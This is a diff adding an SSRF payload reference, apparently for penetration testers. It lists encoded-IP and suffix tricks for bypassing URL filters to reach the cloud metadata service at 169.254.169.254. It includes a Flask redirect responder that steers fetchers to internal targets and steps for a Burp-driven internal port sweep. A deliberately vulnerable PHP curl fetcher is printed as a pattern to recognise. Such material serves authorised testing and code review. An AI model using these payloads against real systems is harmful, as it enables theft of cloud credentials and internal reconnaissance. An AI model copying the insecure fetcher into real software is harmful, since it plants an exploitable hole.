@@ -1,0 +1,74 @@
+# topic: ssrf
+# desc: Server-side request forgery — filter bypasses and internal reach.
+
+## ssrf-decimal-ip-bypass
+# tags: ssrf, bypass, imds, encoding
+# desc: Decimal-encode blocked IP literals to defeat naive string filters.
+Filters that block the literal IMDS/loopback strings can be bypassed by
+encoding the address as a single decimal integer (the host resolves it
+back).
+
+  169.254.169.254  -> 2852039166
+  127.0.0.1        -> 2130706433
+
+Other encodings to try against the same filter class:
+  - octal:       0177.0.0.1
+  - hex:         0x7f000001
+  - mixed/short: 127.1, 0x7f.1
+  - IPv6 mapped: [::ffff:169.254.169.254], [::ffff:a9fe:a9fe]
+
+## ssrf-suffix-satisfier
+# tags: ssrf, bypass, extension-check
+# desc: Append a fragment/param so a URL passes an extension allowlist.
+When the fetcher requires a specific extension (e.g. ".yaml"), append a
+fragment or dummy query so the check passes while the URL still resolves
+to the intended internal target.
+
+  http://169.254.169.254/latest/meta-data/...#.yaml
+  http://169.254.169.254/latest/meta-data/...?x=.yaml
+
+The fragment (#) is never sent to the server; the query (?x=) is sent but
+usually ignored by the target endpoint.
+
+## ssrf-redirect-bypass
+# tags: ssrf, bypass, redirect, open-redirect
+# desc: Use a 302 from an allowed host to reach a blocked internal target.
+If the fetcher validates the initial URL but follows redirects
+(CURLOPT_FOLLOWLOCATION / equivalent), point it at a host you control
+(or an open-redirect on an allowed host) that 302s to the internal
+target. A small Flask responder works:
+
+  from flask import Flask, redirect
+  app = Flask(__name__)
+  @app.route('/r')
+  def r(): return redirect('http://169.254.169.254/latest/meta-data/', code=302)
+
+Validation runs on the first URL only; the redirect target is fetched
+without re-validation.
+
+## ssrf-port-sweep
+# tags: ssrf, enumeration, internal, burp
+# desc: Drive an internal port scan through an SSRF sink.
+Point the SSRF parameter at 127.0.0.1:<port> across a port list and
+distinguish open/closed/filtered by response body, length, or timing.
+With Burp Intruder: set the port as the payload position, then sort/grep
+on a response string or response length to separate live services from
+connection failures.
+
+## ssrf-sink-pattern-php-curl
+# tags: ssrf, php, source-pattern, recognition
+# desc: Recognisable vulnerable PHP curl fetcher (no allowlist).
+The classic deliberately-vulnerable sink: a server-side fetcher that
+curls a user-supplied URL with no host/scheme validation and follows
+redirects. Recognising the shape speeds identification in source review.
+
+  $ch = curl_init();
+  curl_setopt_array($ch, [
+      CURLOPT_URL            => $_GET['url'],   // attacker-controlled
+      CURLOPT_RETURNTRANSFER => true,
+      CURLOPT_FOLLOWLOCATION => true,           // enables redirect bypass
+  ]);
+  $output = curl_exec($ch);
+
+Tells: raw request param into CURLOPT_URL, FOLLOWLOCATION true, no
+allowlist / no scheme check / no IP literal block.
